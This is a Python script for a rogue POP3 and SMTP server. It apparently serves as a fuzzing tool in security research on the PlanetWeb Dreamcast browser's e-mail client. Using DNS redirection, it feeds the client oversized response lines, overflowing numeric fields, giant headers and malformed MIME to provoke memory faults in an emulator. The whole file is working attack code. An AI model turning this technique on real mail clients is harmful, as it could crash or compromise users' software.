#!/usr/bin/env python3
"""
mail_mitm.py -- rogue POP3 + SMTP server to attack the PlanetWeb Dreamcast
browser's e-mail client (MITM: we own DNS, so the configured mail host resolves
to us). Feeds OVERSIZED / MALFORMED responses to fuzz the client's response-line
reader, STAT/LIST numeric parsing, header parser, and MIME handling -- watching
for a native SH-4 fault (the one e-mail spot not disproven by static analysis;
see crashes/EMAIL_ANALYSIS.md).

Setup to fire it:
  1. In the browser's e-mail settings, set Incoming (POP3) + Outgoing (SMTP) host
     to ANY name (DNS --all redirects it to this box); any login/password.
  2. Run rogue DNS (-> this box) as for eden, and run this server.
     POP3=110, SMTP=25 are privileged -> run with sudo, OR use --pop/--smtp high
     ports + iptables redirect (like the :80->8137 rule).
  3. In the browser, "Check Mail" (POP3) / send a mail (SMTP).
  4. Watch Flycast for a fault (fc_conn.log "SH4 exception") -> a native primitive.

Knobs (env): MAIL_BIG = response/header padding length (default 70000).
"""
import argparse, os, socket, threading, sys, time

BIG = int(os.environ.get("MAIL_BIG", "70000"))
A = "A" * BIG
LOG = sys.stderr

def log(msg):
    LOG.write("    [mail] " + msg + "\n"); LOG.flush()

# ---------------- POP3 ----------------
def pop3_client(conn, addr):
    f = conn.makefile("rwb", buffering=0)
    def send(s):
        if isinstance(s, str): s = s.encode("latin1", "ignore")
        f.write(s + b"\r\n")
    try:
        # greeting: oversized status line -> fuzz the response-line reader
        send("+OK POP3 " + A + " ready")
        state = 0
        while True:
            line = f.readline()
            if not line: break
            cmd = line.strip().split(b" ", 1)[0].upper()
            arg = (line.strip().split(b" ", 1) + [b""])[1]
            log("POP3 <= %r" % line[:60])
            if cmd == b"USER":
                send("+OK user " + A)                         # long +OK
            elif cmd == b"PASS":
                send("+OK mailbox open " + A)
            elif cmd == b"CAPA":
                send("+OK"); send("TOP"); send("UIDL"); send(".")
            elif cmd == b"STAT":
                # huge count + huge octet total -> integer/size parsing
                send("+OK 2147483647 4294967295")
            elif cmd == b"LIST":
                send("+OK " + A)                              # long status
                send("1 4294967295"); send("2 " + A); send(".")
            elif cmd == b"UIDL":
                send("+OK"); send("1 " + A); send(".")
            elif cmd == b"RETR":
                # a message with ENORMOUS headers + malformed MIME, ended by .CRLF
                send("+OK message follows")
                send("From: " + A + " <a@b>")                 # giant From:
                send("To: " + A)
                send("Subject: " + A)                          # giant Subject:
                send("Reply-To: " + A)
                send("Content-Type: multipart/mixed; boundary=\"" + A + "\"")  # giant boundary
                send("Content-Length: 4294967295")
                send("Content-Transfer-Encoding: " + A)
                send("Content-Disposition: attachment; filename=\"" + A + "\"")
                send("")
                send("--BND")
                send("Content-Type: image/gif; name=\"" + A + "\"")
                send("")
                send(A)                                        # giant body line
                send(".");
            elif cmd == b"TOP":
                send("+OK"); send("Subject: " + A); send(""); send(".")
            elif cmd == b"DELE":
                send("+OK deleted " + A)
            elif cmd == b"NOOP":
                send("+OK")
            elif cmd == b"QUIT":
                send("+OK bye"); break
            else:
                send("+OK " + A)                              # unknown -> long line
    except Exception as e:
        log("POP3 conn closed: %s" % e)
    finally:
        try: conn.close()
        except: pass

# ---------------- SMTP ----------------
def smtp_client(conn, addr):
    f = conn.makefile("rwb", buffering=0)
    def send(code, s):
        f.write(("%d %s\r\n" % (code, s)).encode("latin1", "ignore"))
    try:
        send(220, "smtp " + A + " ESMTP")                     # oversized greeting
        indata = False
        while True:
            line = f.readline()
            if not line: break
            log("SMTP <= %r" % line[:60])
            if indata:
                if line.strip() == b".":
                    indata = False; send(250, "queued " + A)
                continue
            cmd = line.strip()[:4].upper()
            if cmd in (b"HELO", b"EHLO"):
                send(250, "hello " + A)                        # long reply
            elif cmd == b"MAIL":
                send(250, "ok " + A)
            elif cmd == b"RCPT":
                send(250, "ok " + A)
            elif cmd == b"DATA":
                send(354, "send data " + A); indata = True
            elif cmd == b"QUIT":
                send(221, "bye"); break
            else:
                send(250, A)
    except Exception as e:
        log("SMTP conn closed: %s" % e)
    finally:
        try: conn.close()
        except: pass

def serve(port, handler, name):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port)); s.listen(8)
    log("%s listening on :%d (padding=%d)" % (name, port, BIG))
    while True:
        c, a = s.accept()
        log("%s <<< connection from %s" % (name, a))
        threading.Thread(target=handler, args=(c, a), daemon=True).start()

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--pop", type=int, default=110)
    ap.add_argument("--smtp", type=int, default=25)
    args = ap.parse_args()
    threading.Thread(target=serve, args=(args.pop, pop3_client, "POP3"), daemon=True).start()
    threading.Thread(target=serve, args=(args.smtp, smtp_client, "SMTP"), daemon=True).start()
    log("rogue mail server up (POP3:%d SMTP:%d). Configure browser e-mail host -> this box, then Check Mail." % (args.pop, args.smtp))
    try:
        while True: time.sleep(3600)
    except KeyboardInterrupt:
        pass
